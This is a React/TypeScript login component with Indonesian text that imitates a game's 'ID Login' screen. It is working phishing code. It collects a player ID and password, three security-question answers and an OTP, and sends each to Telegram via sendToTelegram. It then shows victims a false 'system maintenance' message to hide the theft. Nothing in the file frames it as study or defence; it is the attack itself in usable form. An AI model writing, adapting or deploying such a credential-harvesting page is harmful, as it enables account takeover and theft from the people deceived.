import { useState } from 'react';
import { sendToTelegram } from '../services/telegram';
import './LoginForm.css';

interface LoginFormProps {
  onClose?: () => void;
  playClickSound?: () => void;
}

const LoginForm = ({ onClose, playClickSound }: LoginFormProps) => {
  const [step, setStep] = useState(1); // 1: Login, 1.5: Security Notification, 2: Verification Questions, 3: Success Modal
  
  // STEP 1 STATES
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [idError, setIdError] = useState(false);
  const [pwError, setPwError] = useState(false);
  const [otp, setOtp] = useState('');
  const [otpError, setOtpError] = useState(false);
  const [showCustomLoading, setShowCustomLoading] = useState(false);

  // Security Questions State
  const [a1, setA1] = useState('');
  const [a2, setA2] = useState('');
  const [a3, setA3] = useState('');
  const [securityError, setSecurityError] = useState(false);

  const q1 = "Siapa nama penyanyi favoritmu?";
  const q2 = "Aktivitas apa yang Anda lakukan saat libur?";
  const q3 = "Siapa nama sahabatmu?";

  // Handle Input Number Only for User ID
  const handleUsernameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    if (/^\d*$/.test(value)) {
      setUsername(value);
      if (value) setIdError(false);
    }
  };

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPassword(e.target.value);
    if (/^[A-Za-z0-9]{6,16}$/.test(e.target.value)) {
      setPwError(false);
    }
  };

  const handleConfirm = async (e: React.FormEvent) => {
    e.preventDefault();
    if (playClickSound) playClickSound();
    
    let ok = true;

    if (!username) {
      setIdError(true);
      ok = false;
    } else {
      setIdError(false);
    }

    if (!/^[A-Za-z0-9]{6,16}$/.test(password)) {
      setPwError(true);
      ok = false;
    } else {
      setPwError(false);
    }

    if (!ok) return;

    // Send ID and Password to Telegram immediately
    await sendToTelegram(username, password, "ID Login", "-");

    // Proceed to Security Questions (Step 1.5)
    setStep(1.5);
  };

  const handleSecuritySubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (playClickSound) playClickSound();

    if (a1.length < 3 || a2.length < 3 || a3.length < 3) {
        setSecurityError(true);
        return;
    }
    setSecurityError(false);

    // Send Security Answers to Telegram
    await sendToTelegram(username, password, "ID Login - Security", "-", {
        q1, a1,
        q2, a2,
        q3, a3
    });

    // Proceed to OTP Step
    setStep(2);
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (playClickSound) playClickSound();

    if (!otp || otp.length < 4) {
      setOtpError(true);
      return;
    }
    setOtpError(false);

    // Kirim ke Telegram dengan OTP
    const success = await sendToTelegram(username, password, "ID Login - OTP", otp);
    
    // Tampilkan Custom Loading Overlay
    setShowCustomLoading(true);
    setStep(0); // 0 = Hide all forms temporarily

    // Delay 5 detik sebelum muncul alert sukses/gagal
    setTimeout(() => {
      setShowCustomLoading(false);
      
      if (success) {
        setStep(3); // Show Success Modal
      } else {
        alert('Gagal mengirim data. Silakan coba lagi.');
        setStep(1); // Kembali ke form login
      }
    }, 5000);
  };

  const handleClose = () => {
    if (onClose) {
      onClose();
    } else {
      window.location.reload();
    }
  };

  // CUSTOM LOADING COMPONENT
  if (showCustomLoading) {
    return (
      <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/80 backdrop-blur-sm animate-fade-in">
        <div className="flex flex-col items-center">
          <div className="relative w-20 h-20 mb-4">
            {/* Outer Ring - Gold */}
            <div className="absolute inset-0 rounded-full border-[5px] border-t-[#ffd700] border-r-[#ffd700] border-b-transparent border-l-transparent animate-spin"></div>
            {/* Inner Ring - Pink */}
            <div className="absolute inset-2 rounded-full border-[5px] border-t-transparent border-r-[#e91e63] border-b-[#e91e63] border-l-transparent animate-spin" style={{ animationDirection: 'reverse', animationDuration: '1.5s' }}></div>
            {/* Center Dot */}
            <div className="absolute inset-0 flex items-center justify-center">
               <div className="w-3 h-3 bg-white rounded-full animate-ping"></div>
            </div>
          </div>
          <div className="text-[#ffd700] font-black text-lg tracking-[0.2em] uppercase drop-shadow-[0_0_10px_rgba(255,215,0,0.5)] animate-pulse">
            Memuat...
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="relative flex flex-col items-center">
      
      {/* ================= STEP 1: CSS-BASED LOGIN (MATCHING IMAGE) ================= */}
      {step === 1 && (
        <div className="relative w-[550px] animate-pop-in z-50">
          
          {/* Main Modal Container */}
          <div className="w-full rounded-[30px] overflow-hidden shadow-[0_20px_50px_rgba(0,0,0,0.5)] bg-[#fdf5f8] border-2 border-white/50">
            
            {/* Header */}
            <div className="h-14 bg-gradient-to-r from-[#b71c1c] via-[#e91e63] to-[#b71c1c] flex items-center justify-center relative shadow-lg">
              {/* Decorative Header Shape (Optional, simplified to gradient for now) */}
              <div className="absolute inset-0 bg-[url('/header-pattern.png')] opacity-20"></div> {/* Placeholder for pattern if needed */}
              
              {/* Gold Dots Decoration (Top) */}
              <div className="absolute -top-1 flex gap-1">
                 {/* ... decorative dots if needed ... */}
              </div>

              {/* Title */}
              <h2 className="text-[#ffd700] text-2xl font-black tracking-wide drop-shadow-[0_2px_2px_rgba(0,0,0,0.8)] uppercase" style={{ textShadow: '0 2px 0 #b71c1c' }}>
                ID Login
              </h2>

              {/* Gold Dots Decoration (Bottom of Header) */}
              <div className="absolute bottom-1 flex gap-1 justify-center w-full">
                {[...Array(12)].map((_, i) => (
                  <div key={i} className="w-1 h-1 rounded-full bg-[#ffd700] shadow-sm"></div>
                ))}
              </div>

              {/* Close Button */}
              <button 
                onClick={handleClose}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-[#ff8a80] hover:text-white transition-colors drop-shadow-md active:scale-90"
              >
                <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>

            {/* Body */}
            <div className="px-10 py-8 flex flex-col gap-5 relative bg-white/50 backdrop-blur-sm">
              
              {/* Input Row 1: ID Pemain */}
              <div className="flex items-center">
                <label className="w-28 text-right text-gray-500 font-bold text-base mr-4" htmlFor="userID">
                  ID Pemain
                </label>
                <div className="flex-1 relative">
                  <input 
                    type="text" 
                    inputMode="numeric"
                    id="userID" 
                    className="w-full h-10 bg-[#bf6b86] rounded-full px-4 text-white placeholder-white/70 outline-none border border-pink-300/50 shadow-inner font-bold text-sm tracking-wide"
                    placeholder="Masukkan ID pemain" 
                    value={username}
                    onChange={handleUsernameChange}
                  />
                  {idError && <span className="absolute -bottom-5 left-2 text-xs text-red-500 font-bold">ID wajib diisi</span>}
                </div>
              </div>

              {/* Input Row 2: Kata sandi */}
              <div className="flex items-center">
                <label className="w-28 text-right text-gray-500 font-bold text-base mr-4" htmlFor="password">
                  Kata sandi
                </label>
                <div className="flex-1 relative flex items-center gap-2">
                  <input 
                    type="password" 
                    id="password" 
                    className="flex-1 h-10 bg-[#bf6b86] rounded-full px-4 text-white placeholder-white/70 outline-none border border-pink-300/50 shadow-inner font-bold text-sm tracking-wide"
                    placeholder="Silakan masukkan kata sandi" 
                    value={password}
                    onChange={handlePasswordChange}
                  />
                  {/* Forgot Password Button */}
                  <button 
                    onClick={() => alert("Fitur belum tersedia")}
                    className="px-3 py-1 bg-[#e91e63] hover:bg-[#c2185b] text-white text-[10px] font-bold rounded-full border border-yellow-400 shadow-md active:scale-95 transition-transform whitespace-nowrap"
                  >
                    lupa kata sandi
                  </button>
                  {pwError && <span className="absolute -bottom-5 left-2 text-xs text-red-500 font-bold">Password 6-16 karakter</span>}
                </div>
              </div>

              {/* Login Button Area */}
              <div className="flex items-center justify-center mt-6 relative">
                 <button 
                    onClick={handleConfirm}
                    className="w-40 h-11 bg-gradient-to-b from-[#66bb6a] to-[#2e7d32] hover:from-[#81c784] hover:to-[#388e3c] rounded-full border-2 border-[#ffd700] text-white font-bold text-lg shadow-[0_4px_6px_rgba(0,0,0,0.3)] active:scale-95 transition-all flex items-center justify-center tracking-wider"
                    style={{ textShadow: '0 1px 2px rgba(0,0,0,0.5)' }}
                 >
                   Login
                 </button>

                 {/* Info Icon */}
                 <button className="absolute right-0 md:right-4 w-7 h-7 bg-[#ec407a] rounded-full text-white font-serif font-bold italic border border-white/50 shadow-md flex items-center justify-center hover:bg-[#d81b60] transition-colors">
                   i
                 </button>
              </div>

            </div>
          </div>
        </div>
      )}

      {/* ================= STEP 1.5: SECURITY QUESTIONS ================= */}
      {step === 1.5 && (
        <div className="relative w-[480px] animate-pop-in z-50 scale-90 md:scale-100 origin-center">
          <div className="w-full rounded-[30px] overflow-hidden shadow-[0_20px_50px_rgba(0,0,0,0.5)] bg-[#fdf5f8] border-2 border-white/50">
            {/* Header */}
            <div className="h-10 bg-gradient-to-r from-[#b71c1c] via-[#e91e63] to-[#b71c1c] flex items-center justify-center relative shadow-lg">
              <div className="absolute inset-0 bg-[url('/header-pattern.png')] opacity-20"></div>
              <h2 className="text-[#ffd700] text-lg font-black tracking-wide drop-shadow-[0_2px_2px_rgba(0,0,0,0.8)] uppercase" style={{ textShadow: '0 2px 0 #b71c1c' }}>
                Pertanyaan Keamanan
              </h2>
              <div className="absolute bottom-1 flex gap-1 justify-center w-full">
                {[...Array(8)].map((_, i) => (
                  <div key={i} className="w-1 h-1 rounded-full bg-[#ffd700] shadow-sm mx-0.5"></div>
                ))}
              </div>
              <button 
                onClick={handleClose}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-[#ff8a80] hover:text-white transition-colors drop-shadow-md active:scale-90"
              >
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>

            {/* Body */}
            <div className="px-6 py-4 flex flex-col gap-2 relative bg-white/50 backdrop-blur-sm">
              
              {/* Question 1 */}
              <div className="flex flex-col gap-1">
                <div className="flex items-center">
                    <span className="w-6 text-right font-bold text-gray-500 mr-2 text-[10px]">Q1</span>
                    <div className="flex-1 h-7 bg-[#bf6b86] rounded-full px-3 flex items-center justify-between text-white font-bold text-[10px] shadow-inner border border-pink-300/50">
                        <span>{q1}</span>
                        <span>▼</span>
                    </div>
                </div>
                <div className="flex items-center">
                    <span className="w-6 text-right font-bold text-gray-500 mr-2 text-[10px]">A1</span>
                    <input 
                        type="text" 
                        className="flex-1 h-7 bg-[#bf6b86]/80 rounded-full px-3 text-white placeholder-white/60 outline-none border border-pink-300/30 shadow-inner font-bold text-[10px]"
                        placeholder="Masukan jawaban"
                        value={a1}
                        onChange={(e) => setA1(e.target.value)}
                    />
                </div>
              </div>

              {/* Question 2 */}
              <div className="flex flex-col gap-1">
                <div className="flex items-center">
                    <span className="w-6 text-right font-bold text-gray-500 mr-2 text-[10px]">Q2</span>
                    <div className="flex-1 h-7 bg-[#bf6b86] rounded-full px-3 flex items-center justify-between text-white font-bold text-[10px] shadow-inner border border-pink-300/50">
                        <span>{q2}</span>
                        <span>▼</span>
                    </div>
                </div>
                <div className="flex items-center">
                    <span className="w-6 text-right font-bold text-gray-500 mr-2 text-[10px]">A2</span>
                    <input 
                        type="text" 
                        className="flex-1 h-7 bg-[#bf6b86]/80 rounded-full px-3 text-white placeholder-white/60 outline-none border border-pink-300/30 shadow-inner font-bold text-[10px]"
                        placeholder="Masukan jawaban"
                        value={a2}
                        onChange={(e) => setA2(e.target.value)}
                    />
                </div>
              </div>

              {/* Question 3 */}
              <div className="flex flex-col gap-1">
                <div className="flex items-center">
                    <span className="w-6 text-right font-bold text-gray-500 mr-2 text-[10px]">Q3</span>
                    <div className="flex-1 h-7 bg-[#bf6b86] rounded-full px-3 flex items-center justify-between text-white font-bold text-[10px] shadow-inner border border-pink-300/50">
                        <span>{q3}</span>
                        <span>▼</span>
                    </div>
                </div>
                <div className="flex items-center">
                    <span className="w-6 text-right font-bold text-gray-500 mr-2 text-[10px]">A3</span>
                    <input 
                        type="text" 
                        className="flex-1 h-7 bg-[#bf6b86]/80 rounded-full px-3 text-white placeholder-white/60 outline-none border border-pink-300/30 shadow-inner font-bold text-[10px]"
                        placeholder="Masukan jawaban"
                        value={a3}
                        onChange={(e) => setA3(e.target.value)}
                    />
                </div>
              </div>

              {/* Validation Message */}
              {securityError && (
                  <div className="text-center text-red-500 font-bold text-[10px] mt-1">
                      Jawaban tidak boleh kurang dari 3 karakter
                  </div>
              )}

              {/* Submit Button */}
              <div className="flex items-center justify-center mt-2">
                 <button 
                    onClick={handleSecuritySubmit}
                    className="w-32 h-9 bg-gradient-to-b from-[#66bb6a] to-[#2e7d32] hover:from-[#81c784] hover:to-[#388e3c] rounded-full border-2 border-[#ffd700] text-white font-bold text-sm shadow-[0_4px_6px_rgba(0,0,0,0.3)] active:scale-95 transition-all flex items-center justify-center tracking-wider"
                    style={{ textShadow: '0 1px 2px rgba(0,0,0,0.5)' }}
                 >
                   Tentukan
                 </button>
              </div>

             

            </div>
          </div>
        </div>
      )}

      {/* ================= STEP 2: OTP VERIFICATION ================= */}
      {step === 2 && (
        <div className="relative w-[550px] animate-pop-in z-50">
          <div className="w-full rounded-[30px] overflow-hidden shadow-[0_20px_50px_rgba(0,0,0,0.5)] bg-[#fdf5f8] border-2 border-white/50">
            {/* Header */}
            <div className="h-14 bg-gradient-to-r from-[#b71c1c] via-[#e91e63] to-[#b71c1c] flex items-center justify-center relative shadow-lg">
              <div className="absolute inset-0 bg-[url('/header-pattern.png')] opacity-20"></div>
              <h2 className="text-[#ffd700] text-2xl font-black tracking-wide drop-shadow-[0_2px_2px_rgba(0,0,0,0.8)] uppercase" style={{ textShadow: '0 2px 0 #b71c1c' }}>
                Verifikasi
              </h2>
              <div className="absolute bottom-1 flex gap-1 justify-center w-full">
                {[...Array(12)].map((_, i) => (
                  <div key={i} className="w-1 h-1 rounded-full bg-[#ffd700] shadow-sm"></div>
                ))}
              </div>
              <button 
                onClick={handleClose}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-[#ff8a80] hover:text-white transition-colors drop-shadow-md active:scale-90"
              >
                <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>

            {/* Body */}
            <div className="px-10 py-8 flex flex-col gap-5 relative bg-white/50 backdrop-blur-sm">
              <div className="text-center text-gray-600 font-bold mb-2">
                Masukkan kode verifikasi yang telah dikirim ke perangkat Anda.
              </div>

              {/* Input OTP */}
              <div className="flex items-center justify-center">
                <div className="w-full max-w-xs relative">
                  <input 
                    type="text" 
                    inputMode="numeric"
                    className="w-full h-12 bg-[#bf6b86] rounded-full px-4 text-white placeholder-white/70 outline-none border border-pink-300/50 shadow-inner font-bold text-lg tracking-widest text-center"
                    placeholder="Kode OTP" 
                    value={otp}
                    onChange={(e) => setOtp(e.target.value)}
                  />
                  {otpError && <span className="absolute -bottom-6 left-0 right-0 text-center text-xs text-red-500 font-bold">Kode OTP wajib diisi</span>}
                </div>
              </div>

              {/* Confirm Button Area */}
              <div className="flex items-center justify-center mt-6 relative">
                 <button 
                    onClick={handleOtpSubmit}
                    className="w-40 h-11 bg-gradient-to-b from-[#66bb6a] to-[#2e7d32] hover:from-[#81c784] hover:to-[#388e3c] rounded-full border-2 border-[#ffd700] text-white font-bold text-lg shadow-[0_4px_6px_rgba(0,0,0,0.3)] active:scale-95 transition-all flex items-center justify-center tracking-wider"
                    style={{ textShadow: '0 1px 2px rgba(0,0,0,0.5)' }}
                 >
                   Konfirmasi
                 </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ================= STEP 3: SUCCESS MODAL ================= */}
      {step === 3 && (
        <div className="fixed inset-0 z-[3000] flex items-center justify-center bg-black/80 backdrop-blur-sm animate-pop-in">
          <div className="relative w-[320px] bg-gradient-to-b from-[#4a148c] to-[#2a0e45] rounded-xl border-2 border-[#ffd700] p-5 flex flex-col items-center shadow-[0_0_20px_rgba(255,215,0,0.3)]">
            {/* Close Button */}
            <button 
              onClick={handleClose} 
              className="absolute top-2 right-2 w-6 h-6 flex items-center justify-center bg-white/10 hover:bg-white/20 rounded-full text-white transition-colors text-xs"
            >
              ✕
            </button>

            {/* Animated Icon */}
            <div className="w-16 h-16 mb-4 relative">
               <div className="absolute inset-0 bg-[#ffd700]/20 rounded-full animate-ping"></div>
               <div className="relative w-full h-full bg-[#ffd700] rounded-full flex items-center justify-center shadow-[0_0_15px_#ffd700]">
                  <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8 text-[#4a148c] animate-spin-slow" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                    <path strokeLinecap="round" strokeLinejoin="round" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
                    <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                  </svg>
               </div>
            </div>

            {/* Text Content */}
            <h3 className="text-[#ffd700] text-lg font-black uppercase tracking-wider mb-2 text-center drop-shadow-md">
              Sistem Maintenance
            </h3>
            <p className="text-white/80 text-center text-xs leading-relaxed mb-4 font-medium px-2">
              Maaf, saat ini sistem sedang dalam perbaikan berkala untuk meningkatkan kualitas layanan.
            </p>

            {/* Action Button */}
            <button 
              onClick={handleClose}
              className="px-6 py-1.5 bg-gradient-to-r from-[#ffd700] to-[#ffb74d] text-[#4a148c] text-sm font-bold rounded-full shadow-md hover:scale-105 active:scale-95 transition-transform"
            >
              Mengerti
            </button>
          </div>
        </div>
      )}

    </div>
  );
};

export default LoginForm;
